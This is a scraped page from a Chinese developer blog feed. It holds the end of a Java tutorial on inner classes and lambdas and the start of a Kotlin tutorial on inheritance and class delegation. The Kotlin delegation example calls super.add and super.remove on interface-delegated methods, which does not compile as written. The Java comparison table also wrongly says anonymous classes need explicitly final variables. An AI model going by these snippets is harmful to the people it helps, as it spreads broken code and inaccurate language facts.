    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">"我是Outer"</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Inner</span> {
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">showName</span><span class="hljs-params">()</span> {
            System.out.println(name);
        }
    }
}
</code></pre>
<p>上述案例中，Outer是定义的一个普通类，Inner是在Outer类中（类定义大括号内）定义的一个内部类。</p>
<p>编译项目（IDEA中使用快捷键Ctrl + F9）,然后找到对应字节码文件（.class）。</p>
<p>项目字节码文件输出路径一般在项目中有个默认路径，当然也可以自定义。</p>
<p>使用快捷键Ctrl + Shift + Alt + S打开项目结构--&gt;Compiler output设置的路径就是编译后文件所在路径：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/03cf98ce1ff745799c312d9286e4ceb9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oeS5oOw6JyX54mb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558675&amp;x-signature=OFJjxjaY%2F5mM89azajWkeidvdec%3D" alt="" loading="lazy"/></p>
<p>然后根据包名，类名，找到对应的字节码文件。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1aa44f7a2c23486b97ddae43baf000f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oeS5oOw6JyX54mb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558675&amp;x-signature=Tyk2NBN1mOEg7UR1m4EE7EQioSU%3D" alt="" loading="lazy"/></p>
<p>可以看到两个字节码文件，Outer.class和Outer$Inner.class。</p>
<p>这种命名方式是编译器决定的。</p>
<p>注意下面这种形式并不是内部类：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.lazy.snail.day15;

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@ClassName</span> Outer
 * <span class="hljs-doctag">@Description</span> TODO
 * <span class="hljs-doctag">@Author</span> lazysnail
 * <span class="hljs-doctag">@Date</span> 2025/5/29 9:21
 * <span class="hljs-doctag">@Version</span> 1.0
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Outer</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">"我是Outer"</span>;
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Inner</span> {
    
}
</code></pre>
<p>编译后的结果：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/989b0e011cac4706b890af5b377be0c1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oeS5oOw6JyX54mb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558675&amp;x-signature=AHUKKrxQouKY0Q%2B255QzDi2HVeY%3D" alt="" loading="lazy"/></p>
<p>这种形式只是在同一个源文件中定义了两个类，不存在嵌套的关系，相互独立。</p>
<h2 data-id="heading-1">二、四种内部类</h2>
<h3 data-id="heading-2">2.1 成员内部类</h3>
<p>第一章的案例其实就是成员内部类。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.lazy.snail.day15;

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@ClassName</span> Outer
 * <span class="hljs-doctag">@Description</span> TODO
 * <span class="hljs-doctag">@Author</span> lazysnail
 * <span class="hljs-doctag">@Date</span> 2025/5/29 9:21
 * <span class="hljs-doctag">@Version</span> 1.0
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Outer</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">"我是Outer"</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Inner</span> {
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">showName</span><span class="hljs-params">()</span> {
            System.out.println(name);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">Outer</span> <span class="hljs-variable">outer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Outer</span>();
        Outer.<span class="hljs-type">Inner</span> <span class="hljs-variable">inner</span> <span class="hljs-operator">=</span> outer.<span class="hljs-keyword">new</span> <span class="hljs-title class_">Inner</span>();
        inner.showName();
    }
}
</code></pre>
<p>Inner和Outer存在绑定关系，Inner可以访问外部类的所有成员，包括私有字段。</p>
<p>内部类编译后的文件名Outer$Inner.class。</p>
<blockquote>
<p>成员内部类持有外部类的引用，如果生命周期不一致，可能导致外部类无法被GC。</p>
</blockquote>
<h3 data-id="heading-3">2.2 静态内部类</h3>
<p>静态内部类不依赖外部类实例。</p>
<p>只能访问外部类的静态成员。</p>
<p>在集合框架中常见。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d46b27caf4e44a958750e8067b338766~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oeS5oOw6JyX54mb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558675&amp;x-signature=vv7HnVtKiFWdH1IdGWnekOHjGx4%3D" alt="" loading="lazy"/></p>
<p>上图是HashMap的源代码，Node类就是HashMap中定义的一个静态内部类。</p>
<h3 data-id="heading-4">2.3 局部内部类</h3>
<p>局部内部类定义在方法里，作用域仅限方法内部。</p>
<p>可以访问方法里的final或effectively final变量。</p>
<p>用于封装临时的小逻辑块。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.lazy.snail.day15;

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@ClassName</span> Outer2
 * <span class="hljs-doctag">@Description</span> TODO
 * <span class="hljs-doctag">@Author</span> lazysnail
 * <span class="hljs-doctag">@Date</span> 2025/5/29 10:12
 * <span class="hljs-doctag">@Version</span> 1.0
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Outer2</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">great</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-keyword">class</span> <span class="hljs-title class_">Greater</span> {
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sayHi</span><span class="hljs-params">()</span> {
                System.out.println(<span class="hljs-string">"你好 "</span> + name);
            }
        }
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Greater</span>().sayHi();
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">Outer2</span> <span class="hljs-variable">outer2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Outer2</span>();
        outer2.great(<span class="hljs-string">"懒惰蜗牛"</span>);
    }
}
</code></pre>
<blockquote>
<p>Java 8+，方法参数/局部变量不需要显式加final，只要没被修改，编译器会隐式处理成final（effectively final）</p>
</blockquote>
<h3 data-id="heading-5">2.4 匿名内部类</h3>
<p>匿名内部类就是没有名字的内部类。</p>
<p>主要用于快速实现接口或抽象类。</p>
<p>在事件监听、线程创建等场景中常见。</p>
<p>匿名内部类不能有构造方法，也不能实现多个接口。</p>
<p>如果你写过线程相关的代码，你应该见过这段代码：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.lazy.snail.day15;

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@ClassName</span> Outer3
 * <span class="hljs-doctag">@Description</span> TODO
 * <span class="hljs-doctag">@Author</span> lazysnail
 * <span class="hljs-doctag">@Date</span> 2025/5/29 10:21
 * <span class="hljs-doctag">@Version</span> 1.0
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Outer3</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">Runnable</span> <span class="hljs-variable">task</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {
                System.out.println(<span class="hljs-string">"跑线程任务"</span>);
            }
        };
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(task).start();
    }
}
</code></pre>
<p>其实这段代码中task的创建等价于：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AnonymousRunnable</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"跑线程任务"</span>);
    }
}
<span class="hljs-type">Runnable</span> <span class="hljs-variable">task</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnonymousRunnable</span>();
</code></pre>
<p>上下一对比，可以看出，匿名内部类就是适用于快速创建线程任务且实现简单的场景。</p>
<p>单纯的创建一个简单的线程任务，我们没必要再去写个具体的类来实现Runnable接口，再创建对象。</p>
<p>在编译后的字节码文件中，会出现Outer3$1.class文件，该文件反编译后：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/259913d7e2444623b91505f59082e3f8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oeS5oOw6JyX54mb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558675&amp;x-signature=lZYNUcCXlE9pfag0cgGP0%2B5gbrc%3D" alt="" loading="lazy"/></p>
<p>其实就是等价代码的逻辑。</p>
<p>Java 8+引入Lambda表达式后，代码可以进一步简化成：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.lazy.snail.day15;

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@ClassName</span> Outer3
 * <span class="hljs-doctag">@Description</span> TODO
 * <span class="hljs-doctag">@Author</span> lazysnail
 * <span class="hljs-doctag">@Date</span> 2025/5/29 10:21
 * <span class="hljs-doctag">@Version</span> 1.0
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Outer3</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">Runnable</span> <span class="hljs-variable">task</span> <span class="hljs-operator">=</span> () -&gt; System.out.println(<span class="hljs-string">"跑线程任务"</span>);
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(task).start();
    }
}
</code></pre>
<p>Lambda表达式的写法不会再出现Outer3$1.class这样的字节码。</p>
<p>匿名内部类的简单演进过程：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7cff8830d8004ce29e34e370ce4d7aca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oeS5oOw6JyX54mb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558675&amp;x-signature=M7yxO1dkswv%2F9CjPgCKEpPT62nU%3D" alt="" loading="lazy"/></p>
<p>下面是Lambda表达式和匿名内部类的差异总结：</p>






































































<table><thead><tr><th>特性</th><th>Lambda表达式</th><th>匿名内部类</th></tr></thead><tbody><tr><td>本质</td><td>函数式接口的简洁实现</td><td>马上就创建类实例</td></tr><tr><td>语法结构</td><td>(params) -&gt; expression</td><td>new Interface() { 方法实现 }</td></tr><tr><td>编译机制</td><td>使用invokedynamic指令动态生成</td><td>生成独立.class文件（比如Outer3$1.class）</td></tr><tr><td>作用域</td><td>共享外围作用域</td><td>有独立作用域</td></tr><tr><td>this关键字</td><td>指向外围类实例</td><td>指向自身实例</td></tr><tr><td>变量捕获</td><td>可以捕获effectively final变量（隐式final）</td><td>需显式final变量</td></tr><tr><td>内存占用</td><td>较小（JVM级优化）</td><td>较大（生成新类）</td></tr><tr><td>方法支持</td><td>只能实现单个抽象方法</td><td>可实现多方法</td></tr><tr><td>构造函数</td><td>不支持</td><td>支持实例初始化块</td></tr><tr><td>接口类型</td><td>仅限函数式接口（单一抽象方法）</td><td>支持任意接口/抽象类</td></tr><tr><td>调试信息</td><td>栈轨迹更简洁</td><td>有完整类名（但匿名类名可读性差）</td></tr><tr><td>字节码验证</td><td>运行时校验</td><td>编译时校验</td></tr></tbody></table>
<h2 data-id="heading-6">结语</h2>
<p>内部类这种设计让类的定义不局限于文件或包，可以灵活嵌套，配合作用域、访问控制、编译策略，一起构建高内聚、低耦合的结构。</p>
<p>在真实项目开发里，要不要使用内部类，关键在于能不能提升代码的可读性与模块性。</p>
<p>不是所有内部类都值得保留，也不是所有逻辑都该外提成独立类。</p>
<p>如果你把内部类当成语法糖，那它就是个工具；</p>
<p>但如果你把它当作结构表达力的一部分，那它就是一种架构语言。</p>
<p><strong>下一篇预告</strong></p>
<blockquote>
<p>Day16 | Java异常机制详解</p>
</blockquote>
<p>如果你觉得这系列文章对你有帮助，欢迎关注专栏，我们一起坚持下去！</p>
<p><strong>更多文章请关注我的公众号《懒惰蜗牛工坊》</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[kotlin中的继承和委托]]></title>    <link>https://juejin.cn/post/7575757258833084442</link>    <guid>https://juejin.cn/post/7575757258833084442</guid>    <pubDate>2025-11-24T03:15:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575757258833084442" data-draft-id="7575757258833035290" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="kotlin中的继承和委托"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-11-24T03:15:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="南雨北斗"/> <meta itemprop="url" content="https://juejin.cn/user/4059818590476286"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            kotlin中的继承和委托
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4059818590476286/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    南雨北斗
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:15:04.000Z" title="Mon Nov 24 2025 03:15:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 Kotlin 中，<strong>继承（Inheritance）</strong>  和 <strong>委托（Delegation）</strong>  是两种核心的代码复用与扩展机制，二者设计目标不同：继承侧重「类的层级关系与功能继承」，委托侧重「复用已有实现、避免继承耦合」。下面结合语法、场景、区别详细说明：</p>
<h2 data-id="heading-0">一、继承（Inheritance）</h2>
<p>继承的核心是「子类拥有父类的属性和方法」，遵循 <strong>单一继承原则</strong>（一个类只能有一个直接父类），通过 <code>:</code> 语法实现。</p>
<h3 data-id="heading-1">1. 核心语法与规则</h3>
<ul>
<li>父类需用 <code>open</code> 标记（默认 <code>final</code>，不可继承）；</li>
<li>子类用 <code>:</code> 继承父类，需传递父类构造参数；</li>
<li>重写父类方法 / 属性需用 <code>override</code> 关键字（父类成员需 <code>open</code>）。</li>
</ul>
<h3 data-id="heading-2">2. 示例：类的继承</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 开放父类（允许继承）</span>
<span class="hljs-keyword">open</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>(<span class="hljs-keyword">val</span> name: String) {
    <span class="hljs-keyword">open</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">eat</span><span class="hljs-params">()</span></span> {
        println(<span class="hljs-string">"<span class="hljs-variable">$name</span> 在进食"</span>)
    }

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">breathe</span><span class="hljs-params">()</span></span> {
        println(<span class="hljs-string">"<span class="hljs-variable">$name</span> 在呼吸"</span>) <span class="hljs-comment">// 非 open 方法，不可重写</span>
    }
}

<span class="hljs-comment">// 子类继承父类</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span>(name: String) : Animal(name) {
    <span class="hljs-comment">// 重写父类的 open 方法</span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">eat</span><span class="hljs-params">()</span></span> {
        println(<span class="hljs-string">"<span class="hljs-variable">$name</span> 在吃骨头"</span>)
    }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> dog = Dog(<span class="hljs-string">"旺财"</span>)
    dog.eat()      <span class="hljs-comment">// 输出：旺财 在吃骨头（重写后的方法）</span>
    dog.breathe()  <span class="hljs-comment">// 输出：旺财 在呼吸（继承的父类方法）</span>
    println(dog.name) <span class="hljs-comment">// 输出：旺财（继承的父类属性）</span>
}
</code></pre>
<h3 data-id="heading-3">3. 继承的核心特点</h3>
<ul>
<li><strong>is-a 关系</strong>：子类是父类的一种（如 <code>Dog</code> 是 <code>Animal</code> 的一种），语义强耦合；</li>
<li><strong>功能复用</strong>：直接继承父类的非 <code>final</code> 成员，子类可重写扩展；</li>
<li><strong>限制</strong>：单一继承（只能有一个直接父类），易造成类层级臃肿（如多层继承）。</li>
</ul>
<h2 data-id="heading-4">二、委托（Delegation）</h2>
<p>委托的核心是「将类的部分功能委托给另一个类实现」，通过 <code>by</code> 关键字语法糖实现，本质是「组合优于继承」设计原则的体现。</p>
<p>Kotlin 原生支持委托，无需手动编写转发代码（编译器自动生成），分为 <strong>类委托</strong> 和 <strong>属性委托</strong> 两类，核心是「类委托」（复用类功能）。</p>
<h3 data-id="heading-5">1. 类委托（核心场景）</h3>
<h4 data-id="heading-6">语法：<code>class 子类 : 接口 by 委托实例</code></h4>
<ul>
<li>子类实现某个接口，将接口的所有方法委托给一个「委托实例」；</li>
<li>子类可选择性重写接口方法（覆盖委托的实现）。</li>
</ul>
<h4 data-id="heading-7">示例：类委托复用功能</h4>
<p>需求：实现一个「日志集合」，复用 <code>ArrayList</code> 的存储功能，同时在添加 / 删除元素时打印日志。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 1. 定义接口（明确要委托的功能）</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">MyCollection</span>&lt;<span class="hljs-type">T</span>&gt; {
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">add</span><span class="hljs-params">(element: <span class="hljs-type">T</span>)</span></span>: <span class="hljs-built_in">Boolean</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">remove</span><span class="hljs-params">(element: <span class="hljs-type">T</span>)</span></span>: <span class="hljs-built_in">Boolean</span>
    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">size</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Int</span>
}

<span class="hljs-comment">// 2. 委托类（已有实现，需复用）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyArrayList</span>&lt;<span class="hljs-type">T</span>&gt; : <span class="hljs-type">MyCollection</span>&lt;<span class="hljs-type">T</span>&gt; {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> list = ArrayList&lt;T&gt;()

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">add</span><span class="hljs-params">(element: <span class="hljs-type">T</span>)</span></span>: <span class="hljs-built_in">Boolean</span> {
        <span class="hljs-keyword">return</span> list.add(element)
    }

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">remove</span><span class="hljs-params">(element: <span class="hljs-type">T</span>)</span></span>: <span class="hljs-built_in">Boolean</span> {
        <span class="hljs-keyword">return</span> list.remove(element)
    }

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">size</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Int</span> {
        <span class="hljs-keyword">return</span> list.size
    }
}

<span class="hljs-comment">// 3. 目标类：通过委托复用 MyArrayList 的实现，添加日志功能</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">LogCollection</span>&lt;<span class="hljs-type">T</span>&gt; : <span class="hljs-type">MyCollection</span>&lt;<span class="hljs-type">T</span>&gt; <span class="hljs-title">by</span> <span class="hljs-title">MyArrayList</span>&lt;<span class="hljs-type">T</span>&gt;() {
    <span class="hljs-comment">// 选择性重写 add 方法（覆盖委托的实现，添加日志）</span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">add</span><span class="hljs-params">(element: <span class="hljs-type">T</span>)</span></span>: <span class="hljs-built_in">Boolean</span> {
        println(<span class="hljs-string">"添加元素：<span class="hljs-variable">$element</span>"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">super</span>.add(element) <span class="hljs-comment">// 调用委托类的 add 方法（MyArrayList 的实现）</span>
    }

    <span class="hljs-comment">// 选择性重写 remove 方法</span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">remove</span><span class="hljs-params">(element: <span class="hljs-type">T</span>)</span></span>: <span class="hljs-built_in">Boolean</span> {
        println(<span class="hljs-string">"删除元素：<span class="hljs-variable">$element</span>"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">super</span>.remove(element)
    }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">val</span> collection = LogCollection&lt;String&gt;()
    collection.add(<span class="hljs-string">"Kotlin"</span>) <span class="hljs-comment">// 输出：添加元素：Kotlin</span>
    collection.add(<span class="hljs-string">"Java"</span>)   <span class="hljs-comment">// 输出：添加元素：Java</span>
    println(<span class="hljs-string">"集合大小：<span class="hljs-subst">${collection.size()}</span>"</span>) <span class="hljs-comment">// 输出：集合大小：2（复用委托的 size 方法）</span>
    collection.remove(<span class="hljs-string">"Java"</span>) <span class="hljs-comment">// 输出：删除元素：Java</span>
}
</code></pre>
<h4 data-id="heading-8">关键说明：</h4>
<ul>
<li><code>LogCollection</code> 实现 <code>MyCollection</code> 接口，但未手动实现 <code>add/remove/size</code> 方法，而是通过 <code>by MyArrayList&lt;T&gt;()</code> 将这些方法委托给 <code>MyArrayList</code> 实例；</li>
<li>子类可重写接口方法，此时优先执行子类的实现（如 <code>add</code> 方法的日志逻辑），再通过 <code>super.add(element)</code> 调用委托类的原实现；</li>
<li>委托是「has-a 关系」（<code>LogCollection</code> 包含 <code>MyArrayList</code> 实例），语义耦合弱，灵活性高。</li>
</ul>
